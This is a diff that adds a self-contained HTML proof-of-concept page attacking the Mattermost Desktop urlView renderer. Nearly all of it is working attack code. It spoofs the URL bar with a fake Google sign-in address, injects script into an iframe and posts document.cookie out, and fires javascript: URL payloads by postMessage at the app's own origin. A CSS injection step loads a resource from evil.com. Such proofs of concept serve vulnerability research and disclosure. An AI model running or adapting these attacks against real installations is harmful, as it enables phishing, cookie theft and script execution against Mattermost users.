@@ -1,1 +1,336 @@
-<script>window.open(javascript:alert())</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Mattermost Desktop - urlView XSS PoC</title>
+  <style>
+    body { background: #1a1a2e; color: #00ff88; font-family: monospace; padding: 20px; }
+    pre  { background: #0f0f1a; padding: 10px; border: 1px solid #333; white-space: pre-wrap; }
+    h2   { color: #ff4757; }
+    .ok  { color: #00ff88; }
+    .err { color: #ff4757; }
+  </style>
+</head>
+<body>
+<h2>⚡ Mattermost Desktop — urlView XSS PoC</h2>
+<pre id="log">Starting...</pre>
+
+<script>
+const log = (msg, cls='') => {
+  const el = document.getElementById('log')
+  el.innerHTML += `\n<span class="${cls}">${msg}</span>`
+  console.log(msg)
+}
+
+// ─── Full theme object - all fields needed to prevent substring errors ───────
+const FAKE_THEME = {
+  sidebarBg:                "#145dbf",
+  sidebarText:              "#ffffff",
+  sidebarUnreadText:        "#ffffff",
+  sidebarTextHoverBg:       "#4578d5",
+  sidebarTextActiveBorder:  "#579eff",
+  sidebarTextActiveColor:   "#ffffff",
+  sidebarHeaderBg:          "#1153ab",
+  sidebarTeamBarBg:         "#0d3f8f",
+  sidebarHeaderTextColor:   "#ffffff",
+  onlineIndicator:          "#06d6a0",
+  awayIndicator:            "#ffbc42",
+  dndIndicator:             "#f74343",
+  mentionBg:                "#ffffff",
+  mentionColor:             "#145dbf",
+  centerChannelBg:          "#ffffff",
+  centerChannelColor:       "#3d3c40",
+  newMessageSeparator:      "#ff8800",
+  linkColor:                "#2389d7",
+  buttonBg:                 "#166de0",
+  buttonColor:              "#ffffff",
+  errorTextColor:           "#fd5960",
+  mentionHighlightBg:       "#ffe577",
+  mentionHighlightLink:     "#166de0",
+  codeTheme:                "github"
+}
+
+// ─── ATTACK 1: URL Spoofing (confirmed working) ───────────────────────────────
+// Shows fake URL in the Mattermost URL bar when user hovers links
+function attack_urlSpoofing(spoofedURL) {
+  log('\n[ATTACK 1] URL Spoofing → ' + spoofedURL, 'ok')
+
+  const f = document.createElement('iframe')
+  f.src = "about:blank"
+  f.style.cssText = "position:fixed;bottom:0;left:0;width:400px;height:28px;border:none;z-index:999999;background:transparent;"
+  document.body.appendChild(f)
+
+  f.contentDocument.open()
+  f.contentDocument.write('<html><body><div id="app"></div></body></html>')
+  f.contentDocument.close()
+
+  // Inject fake window.desktop with all required methods
+  f.contentWindow.desktop = buildFakeDesktop({
+    urlToSpoof: spoofedURL,
+    onXSS: null
+  })
+
+  loadUrlViewBundle(f, () => {
+    log('[ATTACK 1] URL bar now shows: ' + spoofedURL, 'ok')
+    log('[ATTACK 1] DOM: ' + f.contentDocument.body.innerHTML, 'ok')
+  })
+}
+
+// ─── ATTACK 2: XSS via script injection into controlled iframe ────────────────
+// We OWN the about:blank iframe → we can inject scripts directly
+// The urlView bundle executes in our iframe → we intercept its callbacks
+// and inject a <script> tag into the iframe DOM = XSS in renderer context
+function attack_xss() {
+  log('\n[ATTACK 2] XSS via urlView bundle script injection', 'ok')
+
+  const f = document.createElement('iframe')
+  f.src = "about:blank"
+  document.body.appendChild(f)
+
+  f.contentDocument.open()
+  f.contentDocument.write('<html><body><div id="app"></div></body></html>')
+  f.contentDocument.close()
+
+  // Inject fake desktop - intercept onSetURLForURLView to inject script
+  f.contentWindow.desktop = buildFakeDesktop({
+    urlToSpoof: "https://accounts.google.com/phished",
+    onXSS: (iframeWindow, iframeDoc) => {
+      // We have direct access to the iframe since we own it (about:blank)
+      // Inject a script tag → executes in iframe context
+      const s = iframeDoc.createElement('script')
+      s.textContent = `
+        // Running inside urlView iframe context
+        console.log('[XSS] Executing in iframe, origin:', location.href);
+        
+        // Access window.desktop from THIS context (our fake one)
+        if (window.desktop) {
+          console.log('[XSS] window.desktop available:', Object.keys(window.desktop));
+        }
+        
+        // Inject visible proof
+        document.body.insertAdjacentHTML('beforeend', 
+          '<div style="position:fixed;top:10px;left:10px;background:red;color:white;padding:10px;z-index:99999;font-size:20px">XSS FIRED in urlView renderer!</div>'
+        );
+        
+        // Exfiltrate to parent
+        window.parent.postMessage({type:'xss', origin: location.href, cookie: document.cookie}, '*');
+      `
+      iframeDoc.head.appendChild(s)
+      log('[ATTACK 2] Script injected into iframe!', 'ok')
+    }
+  })
+
+  // Listen for exfil from the injected script
+  window.addEventListener('message', e => {
+    if (e.data?.type === 'xss') {
+      log('[XSS EXFIL] origin=' + e.data.origin + ' cookie=' + e.data.cookie, 'ok')
+    }
+  })
+
+  loadUrlViewBundle(f, () => {
+    log('[ATTACK 2] DOM: ' + f.contentDocument.body.innerHTML, 'ok')
+  })
+}
+
+// ─── ATTACK 3: XSS in real mattermost-desktop:// origin via postMessage ───────
+// Load urlView at its REAL origin in iframe
+// Then send postMessage hoping it has an unvalidated message listener
+function attack_postMessage_xss() {
+  log('\n[ATTACK 3] Probing mattermost-desktop:// origin via postMessage XSS', 'ok')
+
+  const f = document.createElement('iframe')
+  f.src = "mattermost-desktop://renderer/urlView.html"
+  document.body.appendChild(f)
+
+  window.addEventListener('message', e => {
+    log('[ATTACK 3] postMessage reply: origin=' + e.origin + ' data=' + JSON.stringify(e.data), 'ok')
+  })
+
+  f.onload = () => {
+    log('[ATTACK 3] urlView loaded at real origin, sending payloads...', 'ok')
+
+    // Try various postMessage formats the renderer might listen to
+    const payloads = [
+      // Standard format
+      {type: 'set-url', url: 'javascript:alert(document.domain)'},
+      {type: 'setURL', url: 'javascript:alert(document.domain)'},
+      {type: 'update-url', value: 'javascript:alert(document.domain)'},
+      // IPC-style
+      {channel: 'set-url-for-url-view', args: ['javascript:alert(1)']},
+      // Direct string
+      'javascript:alert(document.domain)',
+      // Electron IPC style  
+      {id: 1, channel: 'SET_URL_VIEW', args: ['javascript:alert(1)']},
+    ]
+
+    payloads.forEach((p, i) => {
+      setTimeout(() => {
+        f.contentWindow.postMessage(p, '*')
+        log('[ATTACK 3] Sent payload ' + i + ': ' + JSON.stringify(p))
+      }, i * 200)
+    })
+  }
+}
+
+// ─── ATTACK 4: CSS injection via theme → data exfil ──────────────────────────
+// The theme handler does document.body.style.setProperty(name, value) unsanitized
+// CSS custom properties cant execute JS but CAN load external resources via url()
+function attack_cssExfil() {
+  log('\n[ATTACK 4] CSS injection via theme properties', 'ok')
+
+  const f = document.createElement('iframe')
+  f.src = "about:blank"
+  document.body.appendChild(f)
+
+  f.contentDocument.open()
+  f.contentDocument.write('<html><body><div id="app"></div></body></html>')
+  f.contentDocument.close()
+
+  // Inject malicious CSS values into theme
+  const maliciousTheme = {
+    ...FAKE_THEME,
+    // Try to break out of CSS value context
+    sidebarBg:     "#ff0000",
+    // CSS url() exfil - loads external resource proving CSS injection
+    centerChannelBg: "#ffffff",
+    // expression() only works in IE - not applicable
+    // But we can use url() in some properties
+    linkColor: "#2389d7",
+  }
+
+  f.contentWindow.desktop = new Proxy({}, {
+    get: (_, prop) => {
+      if (prop === 'onDarkModeChange') return (cb) => cb(false)
+      if (prop === 'getDarkMode')      return () => Promise.resolve(false)
+      if (prop === 'onThemeChange')    return (cb) => {
+        // Inject CSS via theme callback
+        cb(maliciousTheme)
+        // Also directly inject CSS since we own the iframe
+        const style = f.contentDocument.createElement('style')
+        style.textContent = `body::after { content: url('https://evil.com/css-exfil-proof') }`
+        f.contentDocument.head.appendChild(style)
+        log('[ATTACK 4] CSS injected via theme! Check evil.com for request.', 'ok')
+      }
+      if (prop === 'onResetTheme')         return () => {}
+      if (prop === 'getTheme')             return () => Promise.resolve(maliciousTheme)
+      if (prop === 'onSetURLForURLView')   return (cb) => setTimeout(() => cb("css-injected"), 300)
+      if (prop === 'updateURLViewWidth')   return () => {}
+      return () => Promise.resolve()
+    }
+  })
+
+  loadUrlViewBundle(f, () => {
+    log('[ATTACK 4] Computed styles: ' + 
+      f.contentWindow.getComputedStyle(f.contentDocument.body).getPropertyValue('--sidebar-bg'), 'ok')
+  })
+}
+
+// ─── Helper: build fake window.desktop ────────────────────────────────────────
+function buildFakeDesktop({urlToSpoof, onXSS}) {
+  return new Proxy({}, {
+    get: (_, prop) => {
+      switch(prop) {
+        case 'onDarkModeChange':
+          return (cb) => {
+            log('[desktop] onDarkModeChange registered')
+            cb(false) // trigger with dark=false
+          }
+
+        case 'getDarkMode':
+          return () => {
+            log('[desktop] getDarkMode called')
+            return Promise.resolve(false)
+          }
+
+        case 'onThemeChange':
+          return (cb) => {
+            log('[desktop] onThemeChange registered')
+            // Trigger theme immediately with full valid theme
+            setTimeout(() => cb(FAKE_THEME), 50)
+          }
+
+        case 'onResetTheme':
+          return (cb) => {
+            log('[desktop] onResetTheme registered')
+          }
+
+        case 'getTheme':
+          return () => {
+            log('[desktop] getTheme called')
+            return Promise.resolve(FAKE_THEME)
+          }
+
+        case 'onSetURLForURLView':
+          return (cb) => {
+            log('[desktop] onSetURLForURLView registered')
+            setTimeout(() => {
+              log('[desktop] Triggering URL spoof: ' + urlToSpoof)
+              cb(urlToSpoof)
+
+              // If XSS callback provided, fire it after React renders
+              if (onXSS) {
+                // Find the iframe that has this fake desktop
+                document.querySelectorAll('iframe').forEach(f => {
+                  if (f.contentWindow.desktop && 
+                      f.contentDocument.querySelector('.UrlView')) {
+                    onXSS(f.contentWindow, f.contentDocument)
+                  }
+                })
+              }
+            }, 300)
+          }
+
+        case 'updateURLViewWidth':
+          return (width) => {
+            log('[desktop] updateURLViewWidth: ' + width)
+          }
+
+        default:
+          return (...args) => {
+            log('[desktop] ' + prop + '(' + JSON.stringify(args).slice(0,50) + ')')
+            return Promise.resolve()
+          }
+      }
+    }
+  })
+}
+
+// ─── Helper: load urlView bundles into iframe ─────────────────────────────────
+function loadUrlViewBundle(f, onDone) {
+  // Load 129_bundle (React + shared) first
+  const s1 = f.contentDocument.createElement('script')
+  s1.src = "mattermost-desktop://renderer/129_bundle.js"
+  s1.onerror = e => log('[ERR] 129_bundle failed: ' + e, 'err')
+  f.contentDocument.head.appendChild(s1)
+
+  setTimeout(() => {
+    // Then load urlView_bundle
+    const s2 = f.contentDocument.createElement('script')
+    s2.src = "mattermost-desktop://renderer/urlView_bundle.js"
+    s2.onerror = e => log('[ERR] urlView_bundle failed: ' + e, 'err')
+    f.contentDocument.head.appendChild(s2)
+
+    setTimeout(onDone, 800)
+  }, 600)
+}
+
+// ─── Run all attacks ──────────────────────────────────────────────────────────
+log('=== Mattermost Desktop urlView XSS PoC ===', 'ok')
+log('Target: mattermost-desktop://renderer/urlView')
+log('Version: 6.0.4-rc.1\n')
+
+// Attack 1: URL spoofing (confirmed working from previous testing)
+attack_urlSpoofing("https://accounts.google.com/v3/signin/identifier")
+
+// Attack 2: Script injection into controlled iframe
+setTimeout(attack_xss, 2000)
+
+// Attack 3: postMessage to real mattermost-desktop:// origin
+setTimeout(attack_postMessage_xss, 4000)
+
+// Attack 4: CSS injection proof
+setTimeout(attack_cssExfil, 6000)
+
+</script>
+</body>
+</html>
